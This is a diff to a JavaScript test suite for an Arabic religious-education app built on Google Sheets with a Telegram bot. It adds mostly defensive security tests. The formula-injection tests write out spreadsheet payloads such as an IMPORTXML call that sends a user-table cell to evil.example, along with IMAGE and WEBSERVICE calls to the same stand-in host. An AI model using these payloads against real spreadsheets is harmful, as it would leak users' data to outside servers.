@@ -7,10 +7,12 @@ const signed = (buf) => Array.from(buf, (b) => (b > 127 ? b - 256 : b));
 
 function boot() {
   const sheets = {};
-  const props = { PIN_SALT: 'salt', HMAC_KEY: 'hmac', SHEET_ID: 'x', BOT_TOKEN: 'set' };
+  const props = { PIN_SALT: 'salt', HMAC_KEY: 'hmac', SHEET_ID: 'x', BOT_TOKEN: 'set', FOLDER_audio: 'fa', FOLDER_images: 'fi' };
   const cache = {};
   let slept = 0;
-  const tg = [], saved = [], fetches = [];
+  const tg = [], saved = [], fetches = [], shared = [];
+  // ملفات درايف ليست من مجلدات المنصة (مثل الشيت نفسه أو ملف خاص لصاحب الحساب)
+  const foreign = (id) => /^ext/.test(id) || id === '1rSVqAiyoQKLvlOYMCXaTYHR_7q3HSz2RHwFN2zwHjPU';
   let mid = 1000, drv = 0;
   function mkSheet(name) {
     const data = [];
@@ -69,10 +71,13 @@ function boot() {
       }
       return { getContentText: () => JSON.stringify({ ok: true, result: { url: 'https://relay.example.workers.dev/hook?x', pending_update_count: 0 } }) };
     } },
-    DriveApp: { getFileById: () => ({ setSharing() {} }), getFolderById: () => ({ createFile: (blob) => { saved.push({ ...(blob && blob._b) }); return { getId: () => 'drv' + (++drv) }; } }), Access: {}, Permission: {} }, Logger: { log() {} }, console: { error() {}, log() {} }
+    DriveApp: { getFileById: (id) => {
+      const parents = [{ getId: () => (foreign(id) ? 'owner-root' : /img|^p|^I/.test(id) ? 'fi' : 'fa') }];
+      return { setSharing() { shared.push(id); }, getParents: () => { let i = 0; return { hasNext: () => i < parents.length, next: () => parents[i++] }; } };
+    }, getFolderById: () => ({ createFile: (blob) => { saved.push({ ...(blob && blob._b) }); return { getId: () => 'drv' + (++drv) }; } }), Access: {}, Permission: {} }, Logger: { log() {} }, console: { error() {}, log() {} }
   };
   const g = new Function(...Object.keys(env), code + '\nreturn { handle_, createSuperAdmin, ensureSheet_, rows_, SCHEMA, hashPin_, VERSION, onTelegram_, BTN, oggOpusToWebm_ };')(...Object.values(env));
-  return { g, sheets, props, mkSheet, slept: () => slept, tg, saved, fetches };
+  return { g, sheets, props, mkSheet, slept: () => slept, tg, saved, fetches, shared };
 }
 
 // بيانات بالشكل القديم (قبل أعمدة last_login_at وجدول LoginAttempts) كما في الشيت الحقيقي
@@ -453,14 +458,14 @@ test('البوت: محاضرة كاملة بالأزرار — صوت، نبي،
   send(2, { voice: { file_id: 'v1', duration: 600, file_size: 1000 } });
   assert.deepStrictEqual(buttons(2), ['آدم', 'نوح', 'يوسف', B.OTHER, B.CANCEL]);
   send(2, 'نوح');
-  assert.match(last(2).text, /«قصة سيدنا نوح»/);
+  assert.match(last(2).text, /«قصة سيدنا نوح عليه السلام»/);
   send(2, B.USE);
   send(2, { photo: [{ file_id: 'p-small' }, { file_id: 'p1' }] });
   send(2, { photo: [{ file_id: 'p2' }] });
   send(2, B.DONE_IMG);
-  assert.match(last(2).text, /العنوان: قصة سيدنا نوح\nعن: نوح\nالصور: 2\nالمدة: 10 دقيقة/);
+  assert.match(last(2).text, /العنوان: قصة سيدنا نوح عليه السلام\nعن: نوح\nالصور: 2\nالمدة: 10 دقيقة/);
   send(2, B.SEND);
-  const l = t.g.rows_('Lectures').find(x => x.title === 'قصة سيدنا نوح');
+  const l = t.g.rows_('Lectures').find(x => x.title === 'قصة سيدنا نوح عليه السلام');
   assert.ok(l && l.status === 'draft' && l.prophet_id === 'noah' && l.created_by === 'T2' && l.class_id === 'C1');
   assert.strictEqual(t.g.rows_('LectureImages').filter(i => i.lecture_id === l.lecture_id).length, 2);
   const note = last(1);
@@ -468,7 +473,7 @@ test('البوت: محاضرة كاملة بالأزرار — صوت، نبي،
   assert.strictEqual(note.reply_markup.inline_keyboard[0][0].url, 'https://mrvoroo.github.io/Serah/teacher/lectures/');
   assert.ok(buttons(2).includes(B.NEW), 'back to main menu');
   send(2, B.MINE);
-  assert.match(last(2).text, /📝 مسودة — قصة سيدنا نوح/);
+  assert.match(last(2).text, /📝 مسودة — قصة سيدنا نوح عليه السلام/);
 });
 
 test('البوت: «موضوع آخر» بعنوان مكتوب، والإلغاء يحذف صور المحاضرة غير المرسلة', () => {
@@ -695,6 +700,187 @@ test('الحساب الموقوف أو المحذوف يخرج فورًا حتى
   // الطفل المحذوف من الفصل يخرج كذلك
   t.call('removeStudent', { user_id: 'S1' }, tok.admin);
   assert.match(t.call('lectures', {}, tok.student).error, /الحساب موقوف/);
+});
+
+// ===== فحص أمني (security-auditor) =====
+// لا توجد خلية نصية تبدأ بـ = + - @ (تُنفَّذ كصيغة في Google Sheets) — المحمية تبدأ بـ '
+function noFormulas(t) {
+  for (const [name, sh] of Object.entries(t.sheets)) sh._data.forEach((r, i) => r.forEach(v => {
+    if (typeof v === 'string' && /^[=+\-@\t\r]/.test(v)) throw new Error(`formula cell in ${name} row ${i + 1}: ${v}`);
+  }));
+}
+
+test('أمن: حقن الصيغ في Google Sheets — كل حقل يكتبه المستخدم يُخزَّن نصًا', () => {
+  const { t, tok } = journeySetup();
+  t.call('ping');
+  const F = '=IMPORTXML("https://evil.example/?"&Users!F2,"//a")';
+  assert.ok(t.call('suggest', { text: F }, tok.student).ok);
+  assert.ok(t.call('addStudent', { name: '+HYPERLINK("https://evil.example","x")', pin: '1234', city: '@SUM(1)', avatar: '-1+2' }, tok.teacher).ok);
+  assert.ok(t.call('updateStudent', { user_id: 'S1', name: '=1+1' }, tok.teacher).ok);
+  assert.ok(t.call('updateLecture', { lecture_id: 'L1', title: '=A1', notes: '-cmd' }, tok.teacher).ok);
+  t.call('seedProphets', { list: SEED }, tok.admin);
+  assert.ok(t.call('saveContent', { prophet_id: 'noah', kind: 'text', title: '@x', body: F }, tok.admin).ok);
+  assert.ok(t.call('saveProphet', { prophet_id: 'adam', name: '=آدم', text: F }, tok.admin).ok);
+  t.call('login', { name: F, pin: '000000' }); // بدون دخول
+  noFormulas(t);
+  const s = t.sheets.Suggestions._data.at(-1);
+  assert.ok(s.includes("'" + F), 'stored as text with quote prefix');
+});
+
+test('أمن: البوت — نص المعلمة (عنوان/محتوى) لا يُكتب كصيغة', () => {
+  const { t, tok, send, B } = botSetup();
+  t.call('seedProphets', { list: SEED }, tok.admin);
+  send(2, '/start ' + t.call('tgLinkToken', {}, tok.teacher).data.url.split('=')[1]);
+  send(2, { voice: { file_id: 'v1', duration: 60 } }); send(2, B.OTHER); send(2, '=IMAGE("https://evil.example/x")');
+  send(2, B.NO_IMG); send(2, B.SEND);
+  send(1, '/start ' + t.call('tgLinkToken', {}, tok.admin).data.url.split('=')[1]);
+  send(1, B.JOURNEY); send(1, 'نوح'); send(1, '+WEBSERVICE("https://evil.example")');
+  noFormulas(t);
+});
+
+test('أمن: لا يمكن ربط محاضرة/صورة/محتوى بملف درايف خارج مجلدات المنصة (ولا مشاركته للعامة)', () => {
+  const { t, tok } = journeySetup();
+  t.call('ping');
+  const SHEET = '1rSVqAiyoQKLvlOYMCXaTYHR_7q3HSz2RHwFN2zwHjPU';
+  const r = t.call('createLecture', { title: 'x', audio_file_id: SHEET }, tok.teacher);
+  assert.ok(!r.ok, 'database sheet must not become a lecture');
+  assert.ok(!t.shared.includes(SHEET), 'database sheet must never be shared publicly');
+  assert.ok(!t.call('addLectureImage', { lecture_id: 'L1', file_id: 'ext-private' }, tok.teacher).ok);
+  t.call('seedProphets', { list: SEED }, tok.admin);
+  assert.ok(!t.call('saveContent', { prophet_id: 'noah', kind: 'image', file_id: 'ext-private' }, tok.admin).ok);
+  assert.ok(!t.call('saveContent', { prophet_id: 'noah', kind: 'audio', file_id: 'ext-private' }, tok.admin).ok);
+  assert.ok(!t.shared.some(id => /^ext/.test(id)), 'no foreign file shared');
+  assert.ok(!t.g.rows_('Lectures').some(l => l.audio_file_id === SHEET));
+  // وبالتالي audioChunk لا يقرأ ملفات خاصة بصلاحية صاحب الدرايف
+  assert.strictEqual(t.call('audioChunk', { id: SHEET }, tok.teacher).error, 'التسجيل غير متاح');
+  // ملف رُفع للمنصة يعمل
+  const ok = t.call('createLecture', { title: 'محاضرة', audio_file_id: 'up-audio-1', duration_sec: 60 }, tok.teacher);
+  assert.ok(ok.ok, JSON.stringify(ok));
+  assert.ok(!t.call('createLecture', { title: '', audio_file_id: 'up-audio-2' }, tok.teacher).ok, 'title required');
+});
+
+test('أمن: الأدمن لا تنشر/تخفي محاضرة فصل آخر (IDOR في setLectureStatus)', () => {
+  const { t, tok } = journeySetup();
+  t.call('ping');
+  t.sheets.Lectures.appendRow(['L9', 'C2', 'فصل آخر', '2026-11-01', 'f9', 1, 'draft', '', 'X', 'x', '']);
+  assert.ok(!t.call('setLectureStatus', { lecture_id: 'L9', status: 'published' }, tok.admin).ok);
+  assert.strictEqual(t.g.rows_('Lectures').find(l => l.lecture_id === 'L9').status, 'draft');
+  assert.ok(t.call('setLectureStatus', { lecture_id: 'L9', status: 'published' }, tok.superadmin).ok, 'developer can');
+});
+
+test('أمن: الحضور لمحاضرة منشورة في فصل الطفل فقط (لا نقاط لا نهائية بمعرّفات وهمية)', () => {
+  const { t, tok } = journeySetup();
+  t.call('ping');
+  for (let i = 0; i < 5; i++) t.call('markAttendance', { lecture_id: 'fake' + i }, tok.student);
+  assert.ok(!t.call('markAttendance', { lecture_id: 'L1' }, tok.student).ok, 'draft lecture');
+  t.sheets.Lectures.appendRow(['L9', 'C2', 'فصل آخر', '2026-11-01', 'f9', 1, 'published', '', 'X', 'x', '']);
+  assert.ok(!t.call('markAttendance', { lecture_id: 'L9' }, tok.student).ok, 'other class');
+  assert.strictEqual(t.g.rows_('Points').length, 0, 'no points for fake/draft/foreign lectures');
+  t.call('setLectureStatus', { lecture_id: 'L1', status: 'published' }, tok.admin);
+  assert.ok(t.call('markAttendance', { lecture_id: 'L1' }, tok.student).ok);
+  assert.ok(t.call('markAttendance', { lecture_id: 'L1' }, tok.student).ok);
+  assert.strictEqual(t.call('me', {}, tok.student).data.points, 10);
+});
+
+test('أمن: تغيير الرمز يُنهي كل الجلسات القديمة، وchangeMyPin يرجع جلسة جديدة', () => {
+  const { t, tok } = journeySetup();
+  t.call('ping');
+  assert.ok(t.call('students', {}, tok.teacher).ok);
+  assert.ok(t.call('setUserPin', { user_id: 'T2', pin: '777777' }, tok.superadmin).ok);
+  assert.match(t.call('students', {}, tok.teacher).error, /جلسة/, 'stolen/old session revoked');
+  const fresh = t.login({ name: 'معلمة ثانية', pin: '777777' });
+  assert.strictEqual(t.call('changeMyPin', { oldPin: '777777', newPin: '1234' }, fresh).error, 'الرمز الجديد 6 أرقام على الأقل');
+  const r = t.call('changeMyPin', { oldPin: '777777', newPin: '888888' }, fresh);
+  assert.ok(r.ok && r.data.token, JSON.stringify(r));
+  assert.match(t.call('students', {}, fresh).error, /جلسة/);
+  assert.ok(t.call('students', {}, r.data.token).ok, 'new token works');
+  // الطفل كذلك
+  t.call('setStudentPin', { user_id: 'S1', pin: '9999' }, tok.admin);
+  assert.match(t.call('lectures', {}, tok.student).error, /جلسة/);
+});
+
+test('أمن: توكن «عرض كـ» يسقط لو المطوّر نفسه أُوقف', () => {
+  const { t, tok } = journeySetup();
+  t.call('ping');
+  const imp = t.call('viewAs', { user_id: 'T1' }, tok.superadmin).data.token;
+  assert.ok(t.call('students', {}, imp).ok);
+  const head = t.sheets.Users._data[0], row = t.sheets.Users._data.find(r => r[1] === 'superadmin');
+  row[head.indexOf('active')] = false;
+  assert.match(t.call('students', {}, imp).error, /جلسة/);
+});
+
+test('أمن: حسابات المعلمات لا تدخل بالمعرّف (عداد تخمين ثانٍ)، والأسماء الوهمية لا تكبّر LoginAttempts', () => {
+  const { t } = journeySetup();
+  t.call('ping');
+  assert.ok(!t.call('login', { user_id: 'T1', pin: '482615' }).ok, 'staff log in by name only');
+  const before = t.sheets.LoginAttempts._data.length;
+  for (let i = 0; i < 30; i++) t.call('login', { name: 'nobody' + i, pin: '000000' });
+  for (let i = 0; i < 30; i++) t.call('login', { user_id: 'Ux' + i, pin: '0000' });
+  assert.strictEqual(t.sheets.LoginAttempts._data.length, before, 'no rows for unknown accounts');
+  assert.ok(t.slept() > 0, 'slowed down instead');
+});
+
+test('أمن: الأدمن ترى سجل عمليات فصلها فقط، والمعلمة ترى اقتراحات فصلها فقط', () => {
+  const { t, tok } = journeySetup();
+  t.call('ping');
+  t.sheets.Classes.appendRow(['C2', 'الفصل الثاني', 'X2', 'OTHER2', 'x']);
+  t.sheets.Users.appendRow(['X2', 'admin', 'أدمن ثانية', 'C2', '', t.g.hashPin_('333333'), '', '', '', true, 'x']);
+  t.sheets.Users.appendRow(['K2', 'student', 'سرّ', 'C2', '', t.g.hashPin_('4444'), '', '', '', true, 'x']);
+  const x2 = t.login({ name: 'أدمن ثانية', pin: '333333' });
+  assert.ok(t.call('addStudent', { name: 'طفل الفصل الثاني', pin: '5555' }, x2).ok);
+  t.call('addStudent', { name: 'علي', pin: '4444' }, tok.admin);
+  const log = t.call('auditLog', {}, tok.admin).data;
+  assert.ok(log.some(a => a.user_id === 'T1'), 'own class entries visible');
+  assert.ok(!JSON.stringify(log).includes('طفل الفصل الثاني'), 'other class hidden');
+  assert.ok(JSON.stringify(t.call('auditLog', {}, tok.superadmin).data).includes('طفل الفصل الثاني'), 'developer sees all');
+  const k2 = t.login({ user_id: 'K2', pin: '4444' });
+  t.call('suggest', { text: 'اقتراح من الفصل الثاني' }, k2);
+  t.call('suggest', { text: 'اقتراح من الفصل الأول' }, tok.student);
+  const mine = t.call('suggestions', {}, tok.teacher).data.map(s => s.text);
+  assert.deepStrictEqual(mine, ['اقتراح من الفصل الأول']);
+  assert.strictEqual(t.call('suggestions', {}, tok.superadmin).data.length, 2);
+  assert.strictEqual(t.call('dashboard', {}, tok.teacher).data.newSuggestions, 1);
+});
+
+test('أمن: حد للطلبات — الاقتراحات وأجزاء الصوت لا تُستنزف بها الحصص', () => {
+  const { t, tok } = journeySetup();
+  t.call('ping');
+  let ok = 0;
+  for (let i = 0; i < 15; i++) if (t.call('suggest', { text: 'x' + i }, tok.student).ok) ok++;
+  assert.strictEqual(ok, 10);
+  assert.match(t.call('suggest', { text: 'y' }, tok.student).error, /طلبات كثيرة/);
+  let n = 0;
+  for (let i = 0; i < 320; i++) if (t.call('audioChunk', { id: 'f1', start: 0 }, tok.teacher).ok) n++;
+  assert.strictEqual(n, 300);
+});
+
+test('أمن: startUpload يقبل أنواع صوت/صورة فقط', () => {
+  const { t, tok } = journeySetup();
+  const type = () => t.fetches.filter(f => /upload\/drive/.test(f.url)).pop().opts.headers['X-Upload-Content-Type'];
+  t.call('startUpload', { name: 'a', mime: 'text/html', kind: 'audio' }, tok.teacher); assert.strictEqual(type(), 'audio/mpeg');
+  t.call('startUpload', { name: 'a', mime: 'image/svg+xml', kind: 'image' }, tok.teacher); assert.strictEqual(type(), 'image/jpeg');
+  t.call('startUpload', { name: 'a', mime: 'audio/x-m4a', kind: 'audio' }, tok.teacher); assert.strictEqual(type(), 'audio/x-m4a');
+  t.call('startUpload', { name: 'a', mime: 'image/png', kind: 'image' }, tok.teacher); assert.strictEqual(type(), 'image/png');
+});
+
+test('أمن: أرقام رمز المعلمة في البوت لا تُحفظ في الشيت (BotState)', () => {
+  const { t, send, B } = botSetup();
+  send(55, 'مرحبا'); send(55, 'الفصل الأول'); send(55, 'المعلمة');
+  for (const d of '4826') send(55, d);
+  assert.ok(!t.sheets.BotState._data.some(r => r.some(v => /4826|"pin":"\d/.test(String(v)))), 'pin digits not in sheet');
+  for (const d of '15') send(55, d);
+  send(55, B.OK);
+  assert.strictEqual(String(t.g.rows_('Users').find(u => u.user_id === 'T1').telegram_id), '55');
+});
+
+test('أمن: البوت — الأدمن التي صارت معلمة لا تكمل إضافة محتوى الرحلة', () => {
+  const { t, tok, send, B } = botSetup();
+  t.call('seedProphets', { list: SEED }, tok.admin);
+  send(1, '/start ' + t.call('tgLinkToken', {}, tok.admin).data.url.split('=')[1]);
+  send(1, B.JOURNEY); send(1, 'نوح');
+  t.call('setRole', { user_id: 'T1', role: 'teacher' }, tok.superadmin);
+  send(1, 'نص بعد سحب الصلاحية');
+  assert.strictEqual(t.g.rows_('ProphetContent').length, 0);
 });
 
 for (const [name, fn] of tests) {
